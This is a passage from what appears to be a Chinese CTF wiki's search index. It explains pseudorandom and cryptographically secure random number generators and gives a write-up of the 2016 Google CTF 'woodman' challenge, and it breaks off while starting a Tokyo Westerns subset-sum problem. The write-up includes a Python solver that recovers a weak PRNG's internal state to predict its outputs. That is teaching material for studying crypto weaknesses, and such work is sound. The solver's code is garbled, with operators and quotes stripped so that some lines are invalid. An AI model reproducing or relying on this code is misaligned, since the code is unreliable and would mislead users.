generators\n\n\n\n\n\u95ee\u9898\n\n\n\u901a\u5e38\u6765\u8bf4\uff0c\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u53ef\u80fd\u4f1a\u6709\u4ee5\u4e0b\u95ee\u9898\n\n\n\n\n\u5728\u67d0\u4e9b\u79cd\u5b50\u7684\u60c5\u51b5\u4e0b\uff0c\u5176\u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u7684\u5468\u671f\u4f1a\u6bd4\u8f83\u5c0f\u3002\n\n\n\u751f\u6210\u5927\u6570\u65f6\uff0c\u5206\u914d\u7684\u4e0d\u5747\u5300\u3002\n\n\n\u8fde\u7eed\u503c\u4e4b\u95f4\u5173\u8054\u5bc6\u5207\uff0c\u77e5\u9053\u540e\u7eed\u503c\uff0c\u53ef\u4ee5\u77e5\u9053\u4e4b\u524d\u7684\u503c\u3002\n\n\n\u8f93\u51fa\u5e8f\u5217\u7684\u503c\u7684\u5927\u5c0f\u5f88\u4e0d\u5747\u5300\u3002\n\n\n\n\n\u53c2\u8003\n\n\nhttps://en.wikipedia.org/wiki/Pseudorandom_number_generator", 
            "title": "\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668"
        }, 
        {
            "location": "/crypto/prng/introduction/#_1", 
            "text": "", 
            "title": "\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u4ecb\u7ecd"
        }, 
        {
            "location": "/crypto/prng/introduction/#_2", 
            "text": "\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08pseudorandom number generator\uff0cPRNG\uff09\uff0c\u53c8\u79f0\u4e3a\u786e\u5b9a\u6027\u968f\u673a\u4f4d\u751f\u6210\u5668\uff08deterministic random bit generator\uff0cDRBG\uff09\uff0c\u662f\u7528\u6765\u751f\u6210 \u63a5\u8fd1\u4e8e\u7edd\u5bf9\u968f\u673a\u6570\u5e8f\u5217\u7684\u6570\u5b57\u5e8f\u5217 \u7684\u7b97\u6cd5\u3002\u4e00\u822c\u6765\u8bf4\uff0cPRNG \u4f1a\u4f9d\u8d56\u4e8e\u4e00\u4e2a\u521d\u59cb\u503c\uff0c\u4e5f\u79f0\u4e3a\u79cd\u5b50\uff0c\u6765\u751f\u6210\u5bf9\u5e94\u7684\u4f2a\u968f\u673a\u6570\u5e8f\u5217\u3002\u53ea\u8981\u79cd\u5b50\u786e\u5b9a\u4e86\uff0cPRNG \u6240\u751f\u6210\u7684\u968f\u673a\u6570\u5c31\u662f\u5b8c\u5168\u786e\u5b9a\u7684\uff0c\u56e0\u6b64\u5176\u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u5e76\u4e0d\u662f\u771f\u6b63\u968f\u673a\u7684\u3002  \u5c31\u76ee\u524d\u800c\u8a00\uff0cPRNG \u5728\u4f17\u591a\u5e94\u7528\u90fd\u53d1\u6325\u7740\u91cd\u8981\u7684\u4f5c\u7528\uff0c\u6bd4\u5982\u6a21\u62df\uff08\u8499\u7279\u5361\u6d1b\u65b9\u6cd5\uff09\uff0c\u7535\u5b50\u7ade\u6280\uff0c\u5bc6\u7801\u5e94\u7528\u3002", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/crypto/prng/introduction/#_3", 
            "text": "\u6b63\u5982\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\uff0c\u4e00\u65e6 PRNG \u6240\u4f9d\u8d56\u7684\u79cd\u5b50\u786e\u5b9a\u4e86\uff0c\u90a3\u4e48 PRNG \u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u57fa\u672c\u4e5f\u5c31\u786e\u5b9a\u4e86\u3002\u8fd9\u91cc\u5b9a\u4e49 PRNG \u7684\u5468\u671f\u5982\u4e0b\uff1a\u5bf9\u4e8e\u4e00\u4e2a PRNG \u7684 \u6240\u6709\u53ef\u80fd\u8d77\u59cb\u72b6\u6001 \uff0c\u4e0d\u91cd\u590d\u5e8f\u5217\u7684\u6700\u957f\u957f\u5ea6\u3002\u663e\u7136\uff0c\u5bf9\u4e8e\u4e00\u4e2a PRNG \u6765\u8bf4\uff0c\u5176\u5468\u671f\u4e0d\u4f1a\u5927\u4e8e\u5176\u6240\u6709\u53ef\u80fd\u7684\u72b6\u6001\u3002\u4f46\u662f\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u5f53\u6211\u4eec\u9047\u5230\u91cd\u590d\u7684\u8f93\u51fa\u65f6\uff0c\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u662f PRNG \u7684\u5468\u671f\uff0c\u56e0\u4e3a PRNG \u7684\u72b6\u6001\u4e00\u822c\u90fd\u662f\u5927\u4e8e\u8f93\u51fa\u7684\u4f4d\u6570\u7684\u3002", 
            "title": "\u5468\u671f\u6027"
        }, 
        {
            "location": "/crypto/prng/introduction/#_4", 
            "text": "\u53c2\u89c1\u7ef4\u57fa\u767e\u79d1\uff0c https://en.wikipedia.org/wiki/Pseudorandom_number_generator \u3002", 
            "title": "\u8bc4\u4ef7\u6807\u51c6"
        }, 
        {
            "location": "/crypto/prng/introduction/#_5", 
            "text": "\u76ee\u524d\u901a\u7528\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u4e3b\u8981\u6709   \u7ebf\u6027\u540c\u4f59\u53d1\u751f\u5668\uff0cLCG  \u7ebf\u6027\u56de\u5f52\u53d1\u751f\u5668  Mersenne Twister  xorshift  generators  WELL  family of generators", 
            "title": "\u5206\u7c7b"
        }, 
        {
            "location": "/crypto/prng/introduction/#_6", 
            "text": "\u901a\u5e38\u6765\u8bf4\uff0c\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u53ef\u80fd\u4f1a\u6709\u4ee5\u4e0b\u95ee\u9898   \u5728\u67d0\u4e9b\u79cd\u5b50\u7684\u60c5\u51b5\u4e0b\uff0c\u5176\u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u7684\u5468\u671f\u4f1a\u6bd4\u8f83\u5c0f\u3002  \u751f\u6210\u5927\u6570\u65f6\uff0c\u5206\u914d\u7684\u4e0d\u5747\u5300\u3002  \u8fde\u7eed\u503c\u4e4b\u95f4\u5173\u8054\u5bc6\u5207\uff0c\u77e5\u9053\u540e\u7eed\u503c\uff0c\u53ef\u4ee5\u77e5\u9053\u4e4b\u524d\u7684\u503c\u3002  \u8f93\u51fa\u5e8f\u5217\u7684\u503c\u7684\u5927\u5c0f\u5f88\u4e0d\u5747\u5300\u3002", 
            "title": "\u95ee\u9898"
        }, 
        {
            "location": "/crypto/prng/introduction/#_7", 
            "text": "https://en.wikipedia.org/wiki/Pseudorandom_number_generator", 
            "title": "\u53c2\u8003"
        }, 
        {
            "location": "/crypto/prng/csprng/", 
            "text": "\u5bc6\u7801\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\n\n\n\u4ecb\u7ecd\n\n\n\u5bc6\u7801\u5b66\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08cryptographically secure pseudo-random number generator\uff0cCSPRNG\uff09\uff0c\u4e5f\u79f0\u4e3a\u5bc6\u7801\u5b66\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08cryptographic pseudo-random number generator\uff0cCPRNG)\uff0c\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u3002\u5b83\u9700\u8981\u6ee1\u8db3\u6ee1\u8db3\u4e00\u4e9b\u5fc5\u8981\u7684\u7279\u6027\uff0c\u4ee5\u4fbf\u4e8e\u9002\u5408\u4e8e\u5bc6\u7801\u5b66\u5e94\u7528\u3002\n\n\n\u5bc6\u7801\u5b66\u7684\u5f88\u591a\u65b9\u9762\u90fd\u9700\u8981\u968f\u673a\u6570\n\n\n\n\n\u5bc6\u94a5\u751f\u6210\n\n\nnonces\n\n\none-time pads\n\n\n\u67d0\u4e9b\u7b7e\u540d\u65b9\u6848\u4e2d\u7684\u76d0\uff0c\u5982 \nECDSA\n\uff0c \nRSASSA-PSS\n\n\n\n\n\u9700\u6c42\n\n\n\u6beb\u65e0\u7591\u95ee\uff0c\u5bc6\u7801\u5b66\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u7684\u8981\u6c42\u80af\u5b9a\u6bd4\u4e00\u822c\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u8981\u9ad8\u3002\u4e00\u822c\u800c\u8a00\uff0cCSPRNG \u7684\u8981\u6c42\u53ef\u4ee5\u5206\u4e3a\u4e24\u7c7b\n\n\n\n\n\u901a\u8fc7\u7edf\u8ba1\u968f\u673a\u6027\u6d4b\u8bd5\u3002CSPRNG \u5fc5\u987b\u901a\u8fc7 \nnext-bit test\n\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u77e5\u9053\u4e86\u4e00\u4e2a\u5e8f\u5217\u7684\u524d k \u4e2a\u6bd4\u7279\uff0c\u653b\u51fb\u8005\u4e0d\u53ef\u80fd\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u4ee5\u5927\u4e8e 50% \u7684\u6982\u7387\u9884\u6d4b\u51fa\u6765\u4e0b\u4e00\u4e2a\u6bd4\u7279\u4f4d\u3002\u8fd9\u91cc\u7279\u522b\u63d0\u53ca\u4e00\u70b9\uff0c\u59da\u671f\u667a\u66fe\u5728 1982 \u5e74\u8bc1\u660e\uff0c\u5982\u679c\u4e00\u4e2a\u751f\u6210\u5668\u53ef\u4ee5\u901a\u8fc7  \nnext-bit test\n\uff0c\u90a3\u4e48\u5b83\u4e5f\u53ef\u4ee5\u901a\u8fc7\u6240\u6709\u5176\u4ed6\u7684\u591a\u9879\u5f0f\u65f6\u95f4\u7edf\u8ba1\u6d4b\u8bd5\u3002\n\n\n\u5fc5\u987b\u80fd\u591f\u62b5\u6297\u8db3\u591f\u5f3a\u7684\u653b\u51fb\uff0c\u6bd4\u5982\u5f53\u751f\u6210\u5668\u7684\u90e8\u5206\u521d\u59cb\u72b6\u6001\u6216\u8005\u8fd0\u884c\u65f6\u7684\u72b6\u6001\u88ab\u653b\u51fb\u8005\u83b7\u77e5\u65f6\uff0c\u653b\u51fb\u8005\u4ecd\u7136\u4e0d\u80fd\u591f\u83b7\u53d6\u6cc4\u6f0f\u72b6\u6001\u4e4b\u524d\u7684\u751f\u6210\u7684\u968f\u673a\u6570\u3002\n\n\n\n\n\u5206\u7c7b\n\n\n\u5c31\u76ee\u524d\u800c\u770b\uff0c CSPRNG \u7684\u8bbe\u8ba1\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u4e09\u7c7b\n\n\n\n\n\u57fa\u4e8e\u5bc6\u7801\u5b66\u7b97\u6cd5\uff0c\u5982\u5bc6\u6587\u6216\u8005\u54c8\u5e0c\u503c\u3002\n\n\n\u57fa\u4e8e\u6570\u5b66\u96be\u9898\n\n\n\u67d0\u4e9b\u7279\u6b8a\u76ee\u7684\u7684\u8bbe\u8ba1\n\n\n\n\n\u53c2\u8003\u6587\u732e\n\n\n\n\nhttps://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator", 
            "title": "\u5bc6\u7801\u5b66\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668"
        }, 
        {
            "location": "/crypto/prng/csprng/#_1", 
            "text": "", 
            "title": "\u5bc6\u7801\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668"
        }, 
        {
            "location": "/crypto/prng/csprng/#_2", 
            "text": "\u5bc6\u7801\u5b66\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08cryptographically secure pseudo-random number generator\uff0cCSPRNG\uff09\uff0c\u4e5f\u79f0\u4e3a\u5bc6\u7801\u5b66\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08cryptographic pseudo-random number generator\uff0cCPRNG)\uff0c\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u3002\u5b83\u9700\u8981\u6ee1\u8db3\u6ee1\u8db3\u4e00\u4e9b\u5fc5\u8981\u7684\u7279\u6027\uff0c\u4ee5\u4fbf\u4e8e\u9002\u5408\u4e8e\u5bc6\u7801\u5b66\u5e94\u7528\u3002  \u5bc6\u7801\u5b66\u7684\u5f88\u591a\u65b9\u9762\u90fd\u9700\u8981\u968f\u673a\u6570   \u5bc6\u94a5\u751f\u6210  nonces  one-time pads  \u67d0\u4e9b\u7b7e\u540d\u65b9\u6848\u4e2d\u7684\u76d0\uff0c\u5982  ECDSA \uff0c  RSASSA-PSS", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/crypto/prng/csprng/#_3", 
            "text": "\u6beb\u65e0\u7591\u95ee\uff0c\u5bc6\u7801\u5b66\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u7684\u8981\u6c42\u80af\u5b9a\u6bd4\u4e00\u822c\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u8981\u9ad8\u3002\u4e00\u822c\u800c\u8a00\uff0cCSPRNG \u7684\u8981\u6c42\u53ef\u4ee5\u5206\u4e3a\u4e24\u7c7b   \u901a\u8fc7\u7edf\u8ba1\u968f\u673a\u6027\u6d4b\u8bd5\u3002CSPRNG \u5fc5\u987b\u901a\u8fc7  next-bit test \uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u77e5\u9053\u4e86\u4e00\u4e2a\u5e8f\u5217\u7684\u524d k \u4e2a\u6bd4\u7279\uff0c\u653b\u51fb\u8005\u4e0d\u53ef\u80fd\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u4ee5\u5927\u4e8e 50% \u7684\u6982\u7387\u9884\u6d4b\u51fa\u6765\u4e0b\u4e00\u4e2a\u6bd4\u7279\u4f4d\u3002\u8fd9\u91cc\u7279\u522b\u63d0\u53ca\u4e00\u70b9\uff0c\u59da\u671f\u667a\u66fe\u5728 1982 \u5e74\u8bc1\u660e\uff0c\u5982\u679c\u4e00\u4e2a\u751f\u6210\u5668\u53ef\u4ee5\u901a\u8fc7   next-bit test \uff0c\u90a3\u4e48\u5b83\u4e5f\u53ef\u4ee5\u901a\u8fc7\u6240\u6709\u5176\u4ed6\u7684\u591a\u9879\u5f0f\u65f6\u95f4\u7edf\u8ba1\u6d4b\u8bd5\u3002  \u5fc5\u987b\u80fd\u591f\u62b5\u6297\u8db3\u591f\u5f3a\u7684\u653b\u51fb\uff0c\u6bd4\u5982\u5f53\u751f\u6210\u5668\u7684\u90e8\u5206\u521d\u59cb\u72b6\u6001\u6216\u8005\u8fd0\u884c\u65f6\u7684\u72b6\u6001\u88ab\u653b\u51fb\u8005\u83b7\u77e5\u65f6\uff0c\u653b\u51fb\u8005\u4ecd\u7136\u4e0d\u80fd\u591f\u83b7\u53d6\u6cc4\u6f0f\u72b6\u6001\u4e4b\u524d\u7684\u751f\u6210\u7684\u968f\u673a\u6570\u3002", 
            "title": "\u9700\u6c42"
        }, 
        {
            "location": "/crypto/prng/csprng/#_4", 
            "text": "\u5c31\u76ee\u524d\u800c\u770b\uff0c CSPRNG \u7684\u8bbe\u8ba1\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u4e09\u7c7b   \u57fa\u4e8e\u5bc6\u7801\u5b66\u7b97\u6cd5\uff0c\u5982\u5bc6\u6587\u6216\u8005\u54c8\u5e0c\u503c\u3002  \u57fa\u4e8e\u6570\u5b66\u96be\u9898  \u67d0\u4e9b\u7279\u6b8a\u76ee\u7684\u7684\u8bbe\u8ba1", 
            "title": "\u5206\u7c7b"
        }, 
        {
            "location": "/crypto/prng/csprng/#_5", 
            "text": "https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator", 
            "title": "\u53c2\u8003\u6587\u732e"
        }, 
        {
            "location": "/crypto/prng/problem/", 
            "text": "\u9898\u76ee\n\n\n2016 Google CTF woodman\n\n\n\u7a0b\u5e8f\u7684\u5927\u6982\u610f\u601d\u5c31\u662f\u4e00\u4e2a\u731c\u6570\u6e38\u620f\uff0c\u5982\u679c\u8fde\u7eed\u731c\u4e2d\u82e5\u5e72\u6b21\uff0c\u5c31\u7b97\u4f1a\u62ff\u5230 flag\uff0c\u80cc\u540e\u7684\u751f\u6210\u76f8\u5e94\u6570\u7684\u6838\u5fc3\u4ee3\u7801\u5982\u4e0b\n\n\nclass\n \nSecurePrng\n(\nobject\n):\n\n    \ndef\n \n__init__\n(\nself\n):\n\n        \n# generate seed with 64 bits of entropy\n\n        \nself\n.\np\n \n=\n \n4646704883L\n\n        \nself\n.\nx\n \n=\n \nrandom\n.\nrandint\n(\n0\n,\n \nself\n.\np\n)\n\n        \nself\n.\ny\n \n=\n \nrandom\n.\nrandint\n(\n0\n,\n \nself\n.\np\n)\n\n\n    \ndef\n \nnext\n(\nself\n):\n\n        \nself\n.\nx\n \n=\n \n(\n2\n \n*\n \nself\n.\nx\n \n+\n \n3\n)\n \n%\n \nself\n.\np\n\n        \nself\n.\ny\n \n=\n \n(\n3\n \n*\n \nself\n.\ny\n \n+\n \n9\n)\n \n%\n \nself\n.\np\n\n        \nreturn\n \n(\nself\n.\nx\n \n^\n \nself\n.\ny\n)\n\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u663e\u7136\uff0c\u6211\u4eec\u731c\u51fa\u524d\u4e24\u8f6e\u8fd8\u662f\u6bd4\u8f83\u5bb9\u6613\u7684\uff0c\u6bd5\u7adf\u6982\u7387\u4e5f\u6709 0.25\u3002\u8fd9\u91cc\u5f53\u6211\u4eec\u731c\u51fa\u524d\u4e24\u8f6e\u540e\uff0c\u4f7f\u7528 Z3 \u6765\u6c42\u89e3\u51fa\u521d\u59cb\u7684 x \u548c y\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u987a\u5229\u7684\u731c\u51fa\u5269\u4e0b\u7684\u503c\u4e86\u3002\n\n\n\u5177\u4f53\u7684\u811a\u672c\u5982\u4e0b\uff0c\u7136\u800c Z3 \u5728\u89e3\u51b3\u8fd9\u6837\u7684\u95ee\u9898\u65f6\u4f3c\u4e4e\u662f\u6709\u95ee\u9898\u7684\u3002\u3002\u3002\n\n\n\u8fd9\u91cc\u6211\u4eec\u8003\u8651\u53e6\u5916\u4e00\u79cd\u65b9\u6cd5\uff0c\n\u4f9d\u6b21\u4ece\u4f4e\u6bd4\u7279\u4f4d\u679a\u4e3e\u5230\u9ad8\u6bd4\u7279\u4f4d\u83b7\u53d6 x \u7684\u503c\n\uff0c\u4e4b\u6240\u4ee5\u80fd\u591f\u8fd9\u6837\u505a\uff0c\u662f\u4f9d\u8d56\u4e8e\u8fd9\u6837\u7684\u89c2\u5bdf\n\n\n\n\na + b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\n\u56e0\u4e3a\u7b2c i \u6bd4\u7279\u4f4d\u8fdb\u884c\u8fd0\u7b97\u65f6\uff0c\u53ea\u6709\u53ef\u80fd\u6536\u5230\u4f4e\u6bd4\u7279\u4f4d\u7684\u8fdb\u4f4d\u6570\u503c\u3002\n\n\na - b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\n\u56e0\u4e3a\u7b2c i \u6bd4\u7279\u4f4d\u8fdb\u884c\u8fd0\u7b97\u65f6\uff0c\u53ea\u6709\u53ef\u80fd\u5411\u4f4e\u6bd4\u7279\u4f4d\u7684\u501f\u4f4d\u3002\n\n\na * b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u56e0\u4e3a\u8fd9\u53ef\u4ee5\u89c6\u4f5c\u591a\u6b21\u52a0\u6cd5\u3002\n\n\na % b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u56e0\u4e3a\u8fd9\u53ef\u89c6\u4e3a\u591a\u6b21\u8fdb\u884c\u51cf\u6cd5\u3002\n\n\na ^ b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u8fd9\u4e00\u70b9\u662f\u663e\u800c\u6613\u89c1\u7684\u3002\n\n\n\n\n\u6ce8\uff1a\u4e2a\u4eba\u611f\u89c9\u8fd9\u4e2a\u6280\u5de7\u975e\u5e38\u6709\u7528\u3002\n\n\n\u6b64\u5916\uff0c\u6211\u4eec\u4e0d\u96be\u5f97\u77e5 p \u7684\u6bd4\u7279\u4f4d\u4e3a 33 \u6bd4\u7279\u4f4d\u3002\u5177\u4f53\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u9996\u5148\u83b7\u53d6\u4e24\u6b21\u731c\u5230\u7684\u503c\uff0c\u8fd9\u4e2a\u6982\u7387\u6709 0.25\u3002\n\n\n\u4f9d\u6b21\u4ece\u4f4e\u6bd4\u7279\u4f4d\u5230\u9ad8\u6bd4\u7279\u4f4d\u4f9d\u6b21\u679a\u4e3e\n\u7b2c\u4e00\u6b21\u8fed\u4ee3\u540e\u7684 x \u7684\u76f8\u5e94\u6bd4\u7279\u4f4d\n\u3002\n\n\n\u6839\u636e\u81ea\u5df1\u679a\u4e3e\u7684\u503c\u5206\u522b\u8ba1\u7b97\u51fa\u7b2c\u4e8c\u6b21\u7684\u503c\uff0c\u53ea\u6709\u5f53\u5bf9\u5e94\u6bd4\u7279\u4f4d\u6b63\u786e\uff0c\u53ef\u4ee5\u5c06\u5176\u52a0\u5165\u5019\u9009\u6b63\u786e\u503c\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u7531\u4e8e\u53d6\u6a21\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u679a\u4e3e\u5230\u5e95\u51cf\u4e86\u591a\u5c11\u6b21\u3002\n\n\n\u6b64\u5916\uff0c\u5728\u6700\u7ec8\u5224\u65ad\u65f6\uff0c\u4ecd\u7136\u9700\u8981\u786e\u4fdd\u5bf9\u5e94\u7684\u503c\u6ee1\u8db3\u4e00\u5b9a\u8981\u6c42\uff0c\u56e0\u4e3a\u4e4b\u524d\u5bf9\u51cf\u4e86\u591a\u5c11\u6b21\u8fdb\u884c\u4e86\u679a\u4e3e\u3002\n\n\n\n\n\u5177\u4f53\u5229\u7528\u4ee3\u7801\u5982\u4e0b\n\n\nimport\n \nos\n\n\nimport\n \nrandom\n\n\nfrom\n \nitertools\n \nimport\n \nproduct\n\n\n\n\nclass\n \nSecurePrng\n(\nobject\n):\n\n    \ndef\n \n__init__\n(\nself\n,\n \nx\n=-\n1\n,\n \ny\n=-\n1\n):\n\n        \n# generate seed with 64 bits of entropy\n\n        \nself\n.\np\n \n=\n \n4646704883L\n  \n# 33bit\n\n        \nif\n \nx\n \n==\n \n-\n1\n:\n\n            \nself\n.\nx\n \n=\n \nrandom\n.\nrandint\n(\n0\n,\n \nself\n.\np\n)\n\n        \nelse\n:\n\n            \nself\n.\nx\n \n=\n \nx\n\n        \nif\n \ny\n \n==\n \n-\n1\n:\n\n            \nself\n.\ny\n \n=\n \nrandom\n.\nrandint\n(\n0\n,\n \nself\n.\np\n)\n\n        \nelse\n:\n\n            \nself\n.\ny\n \n=\n \ny\n\n\n    \ndef\n \nnext\n(\nself\n):\n\n        \nself\n.\nx\n \n=\n \n(\n2\n \n*\n \nself\n.\nx\n \n+\n \n3\n)\n \n%\n \nself\n.\np\n\n        \nself\n.\ny\n \n=\n \n(\n3\n \n*\n \nself\n.\ny\n \n+\n \n9\n)\n \n%\n \nself\n.\np\n\n        \nreturn\n \n(\nself\n.\nx\n \n^\n \nself\n.\ny\n)\n\n\n\n\ndef\n \ngetbiti\n(\nnum\n,\n \nidx\n):\n\n    \nreturn\n \nbin\n(\nnum\n)[\n-\nidx\n \n-\n \n1\n:]\n\n\n\n\ndef\n \nmain\n():\n\n    \nsp\n \n=\n \nSecurePrng\n()\n\n    \ntargetx\n \n=\n \nsp\n.\nx\n\n    \ntargety\n \n=\n \nsp\n.\ny\n\n    \nprint\n \nwe would like to get x \n,\n \ntargetx\n\n    \nprint\n \nwe would like to get y \n,\n \ntargety\n\n\n    \n# suppose we have already guess two number\n\n    \nguess1\n \n=\n \nsp\n.\nnext\n()\n\n    \nguess2\n \n=\n \nsp\n.\nnext\n()\n\n\n    \np\n \n=\n \n4646704883\n\n\n    \n# newx = tmpx*2+3-kx*p\n\n    \nfor\n \nkx\n,\n \nky\n \nin\n \nproduct\n(\nrange\n(\n3\n),\n \nrange\n(\n4\n)):\n\n        \ncandidate\n \n=\n \n[[\n0\n]]\n\n        \n# only 33 bit\n\n        \nfor\n \ni\n \nin\n \nrange\n(\n33\n):\n\n            \n#print \nidx \n, i\n\n            \nnew_candidate\n \n=\n \n[]\n\n            \nfor\n \nold\n,\n \nbit\n \nin\n \nproduct\n(\ncandidate\n,\n \nrange\n(\n2\n)):\n\n                \n#print old, bit\n\n                \noldx\n \n=\n \nold\n[\n0\n]\n\n                \n#oldy = old[1]\n\n                \ntmpx\n \n=\n \noldx\n \n|\n \n((\nbit\n \n \n1\n)\n \n \ni\n)\n\n                \n#tmpy = oldy | ((bit / 2) \n i)\n\n                \ntmpy\n \n=\n \ntmpx\n \n^\n \nguess1\n\n                \nnewx\n \n=\n \ntmpx\n \n*\n \n2\n \n+\n \n3\n \n-\n \nkx\n \n*\n \np\n \n+\n \n(\n1\n \n \n40\n)\n\n                \nnewy\n \n=\n \ntmpy\n \n*\n \n3\n \n+\n \n9\n \n-\n \nky\n \n*\n \np\n \n+\n \n(\n1\n \n \n40\n)\n\n                \ntmp1\n \n=\n \nnewx\n \n^\n \nnewy\n\n                \n#print \ntmpx:    \n, bin(tmpx)\n\n                \n#print \ntargetx: \n, bin(targetx)\n\n                \n#print \ncalculate:     \n, bin(tmp1 + (1 \n 40))\n\n                \n#print \ntarget guess2: \n, bin(guess1 + (1 \n 40))\n\n                \nif\n \ngetbiti\n(\nguess2\n \n+\n \n(\n1\n \n \n40\n),\n \ni\n)\n \n==\n \ngetbiti\n(\n\n                        \ntmp1\n \n+\n \n(\n1\n \n \n40\n),\n \ni\n):\n\n                    \nif\n \n[\ntmpx\n]\n \nnot\n \nin\n \nnew_candidate\n:\n\n                        \n#print \ngot one\n\n                        \n#print bin(tmpx)\n\n                        \n#print bin(targetx)\n\n                        \n#print bin(tmpy)\n\n                        \nnew_candidate\n.\nappend\n([\ntmpx\n])\n\n            \ncandidate\n \n=\n \nnew_candidate\n\n            \n#print len(candidate)\n\n            \n#print candidate\n\n        \nprint\n \ncandidate x for kx: \n,\n \nkx\n,\n \n ky \n,\n \nky\n\n        \nfor\n \nitem\n \nin\n \ncandidate\n:\n\n            \ntmpx\n \n=\n \ncandidate\n[\n0\n][\n0\n]\n\n            \ntmpy\n \n=\n \ntmpx\n \n^\n \nguess1\n\n            \nif\n \ntmpx\n \n=\n \np\n \nor\n \ntmpx\n \n=\n \np\n:\n\n                \ncontinue\n\n            \nmysp\n \n=\n \nSecurePrng\n(\ntmpx\n,\n \ntmpy\n)\n\n            \ntmp1\n \n=\n \nmysp\n.\nnext\n()\n\n            \nif\n \ntmp1\n \n!=\n \nguess2\n:\n\n                \ncontinue\n\n            \nprint\n \ntmpx\n,\n \ntmpy\n\n            \nprint\n(\ntargetx\n \n*\n \n2\n \n+\n \n3\n)\n \n%\n \np\n,\n \n(\ntargety\n \n*\n \n3\n \n+\n \n9\n)\n \n%\n \np\n\n\n\n\nif\n \n__name__\n \n==\n \n__main__\n:\n\n    \nmain\n()\n\n\n\n\n\n2017 Tokyo Westerns CTF 3\nrd\n Backpacker's Problem\n\n\n\u9898\u76ee\u4e2d\u7ed9\u4e86\u4e00\u4e2a cpp \u6587\u4ef6\uff0c\u5927\u6982\u610f\u601d\u5982\u4e0b\n\n\nGiven the integers a_1, a_2, ..., a_N, your task is to find a subsequence b of a\nwhere b_1 + b_2 + ... + b_K = 0.\n\nInput Format: N a_1 a_2 ... a_N\nAnswer Format: K b_1 b_2 ... b_K\n\nExample Input:\n4 -8 -2 3 5\nExample Answer:\n3 -8 3 5\n\n\n\n\n\u5373\u662f\u4e00\u4e2a\u80cc\u5305\u95ee\u9898\u3002\u5176\u4e2d\uff0c\u5728\u672c\u9898\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u89e3\u51b3 20 \u4e2a\u8fd9\u6837\u7684\u80cc\u5305\u95ee\u9898\uff0c\u80cc\u5305\u5927\u5c0f\u4f9d\u6b21\u662f 1 * 10~20 * 10\u3002\u800c\u5b50\u96c6\u6c42\u548c\u7684\u80cc\u5305\u95ee\u9898\u662f\u4e00\u4e2a NPC 